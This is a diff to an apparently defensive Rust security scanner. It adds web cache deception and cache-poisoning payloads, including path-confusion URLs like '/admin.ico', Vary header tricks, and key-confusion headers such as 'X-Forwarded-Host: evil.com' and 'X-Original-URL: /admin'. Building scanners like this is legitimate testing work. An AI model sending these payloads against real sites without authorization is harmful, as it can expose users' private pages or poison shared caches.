@@ -171,6 +171,97 @@ pub fn get_payloads() -> Vec<Payload> {
             severity: Severity::Medium,
             tags: vec!["cache".to_string(), "cloudflare".to_string()],
         },
+        Payload {
+            payload_type: PayloadType::Cache,
+            payload: "/admin.ico".to_string(),
+            description: "Path confusion - cache admin as .ico".to_string(),
+            severity: Severity::High,
+            tags: vec!["cache".to_string(), "deception".to_string()],
+        },
+        Payload {
+            payload_type: PayloadType::Cache,
+            payload: "/profile.jpg".to_string(),
+            description: "Path confusion - cache profile as image".to_string(),
+            severity: Severity::High,
+            tags: vec!["cache".to_string(), "deception".to_string()],
+        },
+        Payload {
+            payload_type: PayloadType::Cache,
+            payload: "/secret.css".to_string(),
+            description: "Path confusion - cache secret as CSS".to_string(),
+            severity: Severity::High,
+            tags: vec!["cache".to_string(), "deception".to_string()],
+        },
+        Payload {
+            payload_type: PayloadType::Cache,
+            payload: "/private.js".to_string(),
+            description: "Path confusion - cache private as JS".to_string(),
+            severity: Severity::High,
+            tags: vec!["cache".to_string(), "deception".to_string()],
+        },
+        Payload {
+            payload_type: PayloadType::Cache,
+            payload: "/dashboard.png".to_string(),
+            description: "Path confusion - cache dashboard as image".to_string(),
+            severity: Severity::High,
+            tags: vec!["cache".to_string(), "deception".to_string()],
+        },
+        Payload {
+            payload_type: PayloadType::Cache,
+            payload: "Vary: Accept-Encoding".to_string(),
+            description: "Vary header manipulation".to_string(),
+            severity: Severity::Medium,
+            tags: vec!["cache".to_string(), "vary".to_string()],
+        },
+        Payload {
+            payload_type: PayloadType::Cache,
+            payload: "Vary: User-Agent".to_string(),
+            description: "Vary User-Agent bypass".to_string(),
+            severity: Severity::Medium,
+            tags: vec!["cache".to_string(), "vary".to_string()],
+        },
+        Payload {
+            payload_type: PayloadType::Cache,
+            payload: "Vary: Accept-Language".to_string(),
+            description: "Vary Accept-Language bypass".to_string(),
+            severity: Severity::Medium,
+            tags: vec!["cache".to_string(), "vary".to_string()],
+        },
+        Payload {
+            payload_type: PayloadType::Cache,
+            payload: "Vary: *".to_string(),
+            description: "Wildcard Vary bypass".to_string(),
+            severity: Severity::Medium,
+            tags: vec!["cache".to_string(), "vary".to_string()],
+        },
+        Payload {
+            payload_type: PayloadType::Cache,
+            payload: "X-Forwarded-Host: evil.com".to_string(),
+            description: "Cache key confusion via Host".to_string(),
+            severity: Severity::High,
+            tags: vec!["cache".to_string(), "key-confusion".to_string()],
+        },
+        Payload {
+            payload_type: PayloadType::Cache,
+            payload: "Accept-Charset: utf-7".to_string(),
+            description: "Cache key confusion via charset".to_string(),
+            severity: Severity::Medium,
+            tags: vec!["cache".to_string(), "key-confusion".to_string()],
+        },
+        Payload {
+            payload_type: PayloadType::Cache,
+            payload: "X-HTTP-Method-Override: GET".to_string(),
+            description: "Cache key confusion via method".to_string(),
+            severity: Severity::Medium,
+            tags: vec!["cache".to_string(), "key-confusion".to_string()],
+        },
+        Payload {
+            payload_type: PayloadType::Cache,
+            payload: "X-Original-URL: /admin".to_string(),
+            description: "Original URL cache confusion".to_string(),
+            severity: Severity::High,
+            tags: vec!["cache".to_string(), "key-confusion".to_string()],
+        },
     ]
 }
 
@@ -187,7 +278,7 @@ mod tests {
     #[test]
     fn test_get_payloads_count_reasonable() {
         let payloads = get_payloads();
-        assert!(payloads.len() > 0);
+        assert!(payloads.len() >= 30);
         assert!(payloads.len() < 10000);
     }
 
